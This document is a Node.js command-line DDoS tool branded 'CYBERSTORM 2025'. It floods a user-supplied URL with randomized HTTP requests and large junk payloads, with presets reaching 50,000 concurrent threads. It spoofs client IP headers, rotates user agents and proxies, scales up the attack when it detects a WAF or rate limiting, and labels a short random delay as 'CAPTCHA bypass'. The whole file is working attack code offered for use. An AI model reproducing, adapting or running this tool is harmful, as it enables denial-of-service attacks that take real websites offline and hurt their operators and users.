#!/usr/bin/env node

const axios = require('axios').default;
const { SocksProxyAgent } = require('socks-proxy-agent');
const chalk = require('chalk');
const figlet = require('figlet');
const inquirer = require('inquirer');
const { table } = require('table');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
const whois = require('whois-json');
const fs = require('fs').promises;
const os = require('os');
const { performance } = require('perf_hooks');
const userAgent = require('user-agents');
const ProgressBar = require('progress');

// Initialize WebSocket server for real-time monitoring
const wss = new WebSocket.Server({ port: 8080 });
let wsClients = [];

wss.on('connection', (ws) => {
    wsClients.push(ws);
    ws.on('close', () => {
        wsClients = wsClients.filter(client => client !== ws);
    });
});

function broadcastStats(data) {
    wsClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

// Cyberpunk-style banner
function displayBanner() {
    console.log(chalk.hex('#00FF00').bold(figlet.textSync('CYBERSTORM 2025', {
        font: 'Cyberlarge',
        horizontalLayout: 'full'
    })));
    console.log(chalk.hex('#FF00FF')('⚡️ QUANG BẢO - ELITE HACKER ⚡️'));
    console.log(chalk.hex('#00FFFF')('╔═══════════════════════════════════════╗'));
    console.log(chalk.hex('#00FFFF')('║ 🔫 0101 TARGET LOCKED 1010 🔫        ║'));
    console.log(chalk.hex('#00FFFF')('║ 🛡️ UNLEASH THE DIGITAL STORM 🛡️     ║'));
    console.log(chalk.hex('#00FFFF')('╚═══════════════════════════════════════╝'));
}

// File integrity check
let EXPECTED_HASH = null;

async function checkFileIntegrity() {
    try {
        const fileContent = await fs.readFile(__filename);
        const fileHash = crypto.createHash('sha256').update(fileContent).digest('hex');
        if (!EXPECTED_HASH) {
            EXPECTED_HASH = fileHash;
            console.log(chalk.yellow(`[SYSTEM] Generated new hash: ${fileHash}`));
        } else if (fileHash !== EXPECTED_HASH) {
            console.log(chalk.red.bold('[CRITICAL ERROR] File tampered! Exiting.'));
            process.exit(1);
        }
    } catch (e) {
        console.log(chalk.red.bold(`[CRITICAL ERROR] Integrity check failed: ${e.message}`));
        process.exit(1);
    }
}

// Clear screen
function clearScreen() {
    process.stdout.write(os.platform() === 'win32' ? '\x1Bc' : '\x1B[2J\x1B[3J\x1B[H');
}

// Progress bar for target selection
function targetSelectionEffect(targetType) {
    const bar = new ProgressBar(`[:bar] LOCKING TARGET: ${targetType.toUpperCase()} [:percent]`, {
        total: 100,
        width: 50,
        complete: chalk.green('█'),
        incomplete: chalk.gray('░')
    });
    let progress = 0;
    const interval = setInterval(() => {
        progress += 25;
        bar.tick(25);
        if (progress >= 100) {
            clearInterval(interval);
            console.log(chalk.green.bold(`[SUCCESS] TARGET LOCKED: ${targetType.toUpperCase()} [100%]!`));
        }
    }, 300);
}

// Loading animation
function loadingAnimation(message, duration) {
    const bar = new ProgressBar(`[:bar] ${message} [:percent]`, {
        total: 100,
        width: 50,
        complete: chalk.cyan('█'),
        incomplete: chalk.gray('░')
    });
    let progress = 0;
    const interval = setInterval(() => {
        progress += 25;
        bar.tick(25);
        if (progress >= 100) {
            clearInterval(interval);
            console.log(chalk.green.bold(`[SUCCESS] ${message} [100%]!`));
        }
    }, duration / 4);
}

// Generate random headers
function generateRandomHeaders(url) {
    const headers = {
        'User-Agent': new userAgent().toString(),
        'Accept': ['text/html', 'application/json', '*/*'][Math.floor(Math.random() * 3)],
        'Accept-Language': ['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8'][Math.floor(Math.random() * 3)],
        'Accept-Encoding': ['gzip, deflate', 'br', 'identity'][Math.floor(Math.random() * 3)],
        'Connection': 'keep-alive',
        'Cache-Control': ['no-cache', 'max-age=0'][Math.floor(Math.random() * 2)],
        'Referer': ['https://google.com', 'https://bing.com', 'https://yahoo.com'][Math.floor(Math.random() * 3)],
        'X-Forwarded-For': `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
        'DNT': Math.random() > 0.5 ? '1' : '0',
        'CF-Connecting-IP': `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
        'Origin': url,
        'Sec-Fetch-Site': ['same-origin', 'cross-site', 'none'][Math.floor(Math.random() * 3)],
        'Sec-Fetch-Mode': ['navigate', 'same-origin', 'cors'][Math.floor(Math.random() * 3)],
        'Sec-Fetch-Dest': ['document', 'empty', 'iframe'][Math.floor(Math.random() * 3)],
    };
    return headers;
}

// Proxy rotation with dynamic fetching
const PROXY_LIST = [
    // Add proxy list or fetch dynamically from a reliable source
];
async function getRandomProxy() {
    // Placeholder for dynamic proxy fetching (e.g., from a proxy API)
    return PROXY_LIST.length ? PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)] : null;
}

// Random POST data
function generatePostData() {
    return {
        key: Math.floor(Math.random() * 9999999),
        value: Math.random(),
        secret: crypto.randomBytes(16).toString('hex'),
        token: crypto.createHash('md5').update(Date.now().toString()).digest('hex'),
        attack_vector: ['destroy', 'obliterate', 'annihilate'][Math.floor(Math.random() * 3)],
        mouse_event: ['click', 'mousemove', 'mousedown'][Math.floor(Math.random() * 3)]
    };
}

// Global counters
let successCount = 0;
let errorCount = 0;
let responseTimes = [];
let statusCodes = {};

// Validate URL
function validateUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = `http://${url}`;
    }
    try {
        new URL(url);
        return url;
    } catch (e) {
        throw new Error(`Invalid URL: ${e.message}`);
    }
}

// Save attack configuration
async function saveAttackConfig(url, numThreads, requestsPerThread, targetType) {
    const config = {
        url,
        numThreads,
        requestsPerThread,
        targetType,
        startTime: new Date().toISOString()
    };
    try {
        await fs.writeFile('cyberstorm_attack.json', JSON.stringify(config, null, 2));
        console.log(chalk.yellow(`[SYSTEM] Attack configuration saved: ${url}`));
    } catch (e) {
        console.log(chalk.red(`[ERROR] Failed to save attack config: ${e.message}`));
    }
}

// Assess target security level
async function assessTargetSecurity(url) {
    let securityLevel = 'MEDIUM';
    let recommendedThreads = 1000;
    let recommendedRequests = 1000;

    try {
        const response = await axios.head(url, { headers: generateRandomHeaders(url), timeout: 5000 });
        const headers = response.headers;
        const wafIndicators = ['cloudflare', 'akamai', 'sucuri', 'incapsula'];
        const server = headers['server']?.toLowerCase() || '';
        const cdnWafDetected = wafIndicators.some(waf => server.includes(waf) || headers['x-powered-by']?.toLowerCase().includes(waf));
        const rateLimit = headers['x-ratelimit-limit'] || response.status === 429 || response.status === 403;
        const domain = new URL(url).hostname;
        const whoisInfo = await whois(domain);
        const creationDate = whoisInfo.creationDate ? new Date(whoisInfo.creationDate) : null;
        const domainAge = creationDate ? (Date.now() - creationDate) / (1000 * 60 * 60 * 24) : 0;

        if (cdnWafDetected || rateLimit) {
            securityLevel = 'HIGH';
            recommendedThreads = 5000;
            recommendedRequests = 2000;
        } else if (domainAge > 365) {
            securityLevel = 'MEDIUM';
            recommendedThreads = 2000;
            recommendedRequests = 1000;
        } else {
            securityLevel = 'LOW';
            recommendedThreads = 500;
            recommendedRequests = 500;
        }

        console.log(chalk.cyan(`[SYSTEM] Security Assessment: ${securityLevel}, Threads: ${recommendedThreads}, Requests: ${recommendedRequests}`));
    } catch (e) {
        console.log(chalk.yellow(`[SYSTEM] Security assessment failed: ${e.message}. Using default values.`));
    }

    return { securityLevel, recommendedThreads, recommendedRequests };
}

// Perform attack with enhanced bypass techniques
async function performAttack(url, requestsPerThread, attackName) {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH'];
    let sessionCookies = {};

    // Get initial cookies
    try {
        const response = await axios.get(url, { headers: generateRandomHeaders(url), timeout: 5000 });
        sessionCookies = response.headers['set-cookie'] || [];
        console.log(chalk.cyan(`[${attackName.toUpperCase()}] Acquired cookies: ${sessionCookies.join(', ')}`));
    } catch {}

    for (let i = 0; i < requestsPerThread; i++) {
        try {
            const method = methods[Math.floor(Math.random() * methods.length)];
            const headers = generateRandomHeaders(url);
            headers['Connection'] = 'keep-alive';
            headers['Keep-Alive'] = 'timeout=5, max=1000';
            headers['X-Forwarded-For'] = `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
            const proxy = await getRandomProxy();
            const payload = 'X'.repeat(Math.floor(Math.random() * (1048576 - 524288 + 1)) + 524288); // 512KB-1MB
            const startTime = performance.now();

            const config = {
                method,
                url,
                headers,
                timeout: 2000,
                data: method === 'POST' || method === 'PUT' || method === 'PATCH' ? payload : undefined,
                httpsAgent: proxy ? new SocksProxyAgent(proxy) : undefined
            };

            const response = await axios(config);
            const responseTime = performance.now() - startTime;

            successCount++;
            responseTimes.push(responseTime);
            statusCodes[response.status] = (statusCodes[response.status] || 0) + 1;

            if ([429, 403, 522].includes(response.status)) {
                console.log(chalk.red(`[${attackName.toUpperCase()}] Attack: Status ${response.status} - TARGET OVERLOADED`));
            } else {
                console.log(chalk.yellow(`[${attackName.toUpperCase()}] Attack: Status ${response.status}`));
            }

            broadcastStats({
                attackName,
                status: response.status,
                responseTime,
                successCount,
                errorCount
            });
        } catch (e) {
            errorCount++;
            console.log(chalk.red(`[${attackName.toUpperCase()}] Attack failed: ${e.message}`));
        }
        await new Promise(resolve => setTimeout(resolve, Math.random() * 9 + 1)); // Random delay for CAPTCHA bypass
    }
}

// Target configurations
const TARGET_CONFIGS = [
    { id: '1', name: 'cyberstorm', threads: 5000, requests: 1000, desc: 'HTTP Attack 5M reqs, CAPTCHA bypass', level: 'Very High', application: 'Application Layer Attack' },
    { id: '2', name: 'megastorm', threads: 10000, requests: 1000, desc: 'HTTP Attack 10M reqs, CAPTCHA bypass', level: 'Extreme', application: 'Large-Scale Application Attack' },
    { id: '3', name: 'ultrastorm', threads: 20000, requests: 1000, desc: 'HTTP Attack 20M reqs, CAPTCHA bypass', level: 'Ultra', application: 'Maximum Target Attack' },
    { id: '4', name: 'hyperstorm', threads: 30000, requests: 1000, desc: 'HTTP Attack 30M reqs, CAPTCHA bypass', level: 'Hyper', application: 'Extreme Target Attack' },
    { id: '5', name: 'superstorm', threads: 40000, requests: 1000, desc: 'HTTP Attack 40M reqs, CAPTCHA bypass', level: 'Supreme', application: 'Massive Target Attack' },
    { id: '6', name: 'godstorm', threads: 50000, requests: 1000, desc: 'HTTP Attack 50M reqs, CAPTCHA bypass', level: 'Godlike', application: 'Ultimate Target Attack' }
];

// Display ordered functions
function displayOrderedFunctions() {
    clearScreen();
    displayBanner();
    const data = TARGET_CONFIGS.sort((a, b) => (a.threads * a.requests) - (b.threads * b.requests))
        .map(func => [
            func.id,
            chalk.green(func.name.toUpperCase()),
            func.desc,
            func.threads.toLocaleString(),
            func.requests.toLocaleString(),
            (func.threads * func.requests).toLocaleString(),
            func.level,
            func.application
        ]);
    console.log(table([['ID', 'Name', 'Description', 'Threads', 'Requests', 'Total Hits', 'Level', 'Application'], ...data], {
        border: {
            topBody: chalk.cyan('─'),
            topJoin: chalk.cyan('┬'),
            topLeft: chalk.cyan('┌'),
            topRight: chalk.cyan('┐'),
            bottomBody: chalk.cyan('─'),
            bottomJoin: chalk.cyan('┴'),
            bottomLeft: chalk.cyan('└'),
            bottomRight: chalk.cyan('┘'),
            bodyLeft: chalk.cyan('│'),
            bodyRight: chalk.cyan('│'),
            bodyJoin: chalk.cyan('│'),
            joinBody: chalk.cyan('─'),
            joinLeft: chalk.cyan('├'),
            joinRight: chalk.cyan('┤'),
            joinJoin: chalk.cyan('┼')
        }
    }));
    return inquirer.prompt([{ type: 'input', name: 'continue', message: chalk.cyan('Press Enter to return to menu...') }]);
}

// Display target menu
async function displayTargetMenu() {
    clearScreen();
    displayBanner();
    const data = [
        ['0', chalk.green('List'), 'View attack strategies'],
        ...TARGET_CONFIGS.sort((a, b) => parseInt(a.id) - parseInt(b.id)).map(target => [target.id, chalk.green(target.name.toUpperCase()), target.desc])
    ];
    console.log(table([['ID', 'Name', 'Description'], ...data], {
        border: {
            topBody: chalk.cyan('─'),
            topJoin: chalk.cyan('┬'),
            topLeft: chalk.cyan('┌'),
            topRight: chalk.cyan('┐'),
            bottomBody: chalk.cyan('─'),
            bottomJoin: chalk.cyan('┴'),
            bottomLeft: chalk.cyan('└'),
            bottomRight: chalk.cyan('┘'),
            bodyLeft: chalk.cyan('│'),
            bodyRight: chalk.cyan('│'),
            bodyJoin: chalk.cyan('│'),
            joinBody: chalk.cyan('─'),
            joinLeft: chalk.cyan('├'),
            joinRight: chalk.cyan('┤'),
            joinJoin: chalk.cyan('┼')
        }
    }));
}

// Main function
async function main() {
    await checkFileIntegrity();

    while (true) {
        try {
            await displayTargetMenu();
            const { choice } = await inquirer.prompt([{
                type: 'input',
                name: 'choice',
                message: chalk.cyan('Enter choice (0-6):')
            }]);

            if (choice === '0') {
                await displayOrderedFunctions();
                continue;
            }

            const target = TARGET_CONFIGS.find(t => t.id === choice);
            if (!target) {
                console.log(chalk.red('[ERROR] Invalid choice! Try again.'));
                await new Promise(resolve => setTimeout(resolve, 1000));
                continue;
            }

            targetSelectionEffect(target.name);

            const { inputUrl } = await inquirer.prompt([{
                type: 'input',
                name: 'inputUrl',
                message: chalk.cyan('Enter target URL:')
            }]);

            if (!inputUrl) {
                console.log(chalk.red('[ERROR] URL cannot be empty! Try again.'));
                await new Promise(resolve => setTimeout(resolve, 1000));
                continue;
            }

            let validatedUrl;
            try {
                validatedUrl = validateUrl(inputUrl);
            } catch (e) {
                console.log(chalk.red(`[ERROR] ${e.message}`));
                await new Promise(resolve => setTimeout(resolve, 1000));
                continue;
            }

            console.log(chalk.green(`[SYSTEM] Target locked: ${validatedUrl}`));

            const { useCustom } = await inquirer.prompt([{
                type: 'confirm',
                name: 'useCustom',
                message: chalk.cyan(`Customize threads and requests? (Default: ${target.threads} threads, ${target.requests} requests/thread)`)
            }]);

            let numThreads = target.threads;
            let requestsPerThread = target.requests;

            if (useCustom) {
                const { threads, requests } = await inquirer.prompt([
                    {
                        type: 'number',
                        name: 'threads',
                        message: chalk.cyan('Enter number of threads (100-100000):'),
                        default: target.threads
                    },
                    {
                        type: 'number',
                        name: 'requests',
                        message: chalk.cyan('Enter requests per thread (100-10000):'),
                        default: target.requests
                    }
                ]);
                numThreads = Math.max(100, Math.min(threads, 100000));
                requestsPerThread = Math.max(100, Math.min(requests, 10000));
            }

            const totalRequests = numThreads * requestsPerThread;
            console.log(chalk.red(`[WARNING] ${target.name.toUpperCase()} attack will send ${totalRequests.toLocaleString()} requests! Prepare system!`));
            console.log(chalk.yellow(`[SYSTEM] To stop: Use 'killall node' (Linux) or Task Manager (Windows)`));

            const { confirm } = await inquirer.prompt([{
                type: 'confirm',
                name: 'confirm',
                message: chalk.red('[SYSTEM] Confirm attack')
            }]);

            if (!confirm) {
                console.log(chalk.yellow('[SYSTEM] Attack cancelled'));
                continue;
            }

            console.log(chalk.cyan('[SYSTEM] Assessing target security level...'));
            loadingAnimation('Security Assessment', 2000);
            const { securityLevel, recommendedThreads, recommendedRequests } = await assessTargetSecurity(validatedUrl);

            const attackStrategy = securityLevel === 'LOW' ? 'LIGHT ATTACK' :
                                  securityLevel === 'MEDIUM' ? 'MODERATE FORCE' : 'MAXIMUM FORCE';

            console.log(chalk.cyan(`
╔═══════════════════════════════════════╗
║ ATTACK STRATEGY: ${target.name.toUpperCase()}              ║
║ Target: ${validatedUrl}                ║
║ Threads: ${numThreads.toLocaleString()}                    ║
║ Requests/Thread: ${requestsPerThread.toLocaleString()}     ║
║ Strategy: ${attackStrategy}            ║
║ Total Hits: ${totalRequests.toLocaleString()}              ║
╚═══════════════════════════════════════╝
            `));

            console.log(chalk.red(`[SYSTEM] Initiating ${target.name.toUpperCase()} attack...`));
            loadingAnimation('Initializing Attack System', 3000);

            const startTime = performance.now();
            await saveAttackConfig(validatedUrl, numThreads, requestsPerThread, target.name);

            const maxThreadsPerBatch = 10000;
            let remainingThreads = numThreads;
            let batchCount = 0;

            const bar = new ProgressBar(`[:bar] Attacking ${target.name.toUpperCase()} [:percent]`, {
                total: totalRequests,
                width: 50,
                complete: chalk.green('█'),
                incomplete: chalk.gray('░')
            });

            while (remainingThreads > 0) {
                const batchSize = Math.min(remainingThreads, maxThreadsPerBatch);
                console.log(chalk.cyan(`[SYSTEM] Starting batch ${batchCount + 1} with ${batchSize} threads...`));

                const promises = Array(batchSize).fill().map(() => performAttack(validatedUrl, requestsPerThread, target.name));
                await Promise.all(promises);
                bar.tick(batchSize * requestsPerThread);

                remainingThreads -= batchSize;
                batchCount++;
                if (remainingThreads > 0) {
                    console.log(chalk.cyan(`[SYSTEM] Completed batch ${batchCount}. ${remainingThreads} threads remaining.`));
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            console.log(chalk.red(`[SYSTEM] ${target.name.toUpperCase()} attack completed with ${numThreads} threads!`));

            const totalTime = (performance.now() - startTime) / 1000;
            const avgResponseTime = responseTimes.length ? responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length : 0;
            const maxResponseTime = responseTimes.length ? Math.max(...responseTimes) : 0;
            const minResponseTime = responseTimes.length ? Math.min(...responseTimes) : 0;

            const statusSummary = Object.entries(statusCodes).map(([code, count]) => `[+] Code ${code}: ${count} times`).join('\n');

            const report = `
╔═══════════════════════════════════════╗
║ CAMPAIGN REPORT: ${target.name.toUpperCase()}           ║
║ Total Hits: ${totalRequests.toLocaleString()}          ║
║ Success: ${successCount.toLocaleString()} (${(successCount / totalRequests * 100).toFixed(1)}%) ║
║ Failures: ${errorCount.toLocaleString()} (${(errorCount / totalRequests * 100).toFixed(1)}%)   ║
║ Total Time: ${totalTime.toFixed(2)} seconds           ║
║ Avg Response Time: ${avgResponseTime.toFixed(2)}ms    ║
║ Peak Performance: ${maxResponseTime.toFixed(2)}ms     ║
║ Min Latency: ${minResponseTime.toFixed(2)}ms          ║
║ Hits/Second: ${(totalRequests / totalTime).toFixed(0)}║
║ Status Code Stats:                            ║
${statusSummary}
║ TARGET NEUTRALIZED!                           ║
╚═══════════════════════════════════════╝
            `;
            console.log(chalk.green(report));

            await fs.writeFile(`attack_report_${new Date().toISOString().replace(/[:.]/g, '')}.json`, JSON.stringify({
                target: validatedUrl,
                strategy: target.name,
                totalRequests,
                successCount,
                errorCount,
                totalTime,
                avgResponseTime,
                maxResponseTime,
                minResponseTime,
                requestsPerSecond: totalRequests / totalTime,
                statusCodes
            }, null, 2));

        } catch (e) {
            if (e.message.includes('SIGINT')) {
                console.log(chalk.yellow(`[SYSTEM] ${target.name.toUpperCase()} attack stopped by user`));
                process.exit(0);
            }
            console.log(chalk.red(`[ERROR] ${e.message}`));
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

main().catch(console.error);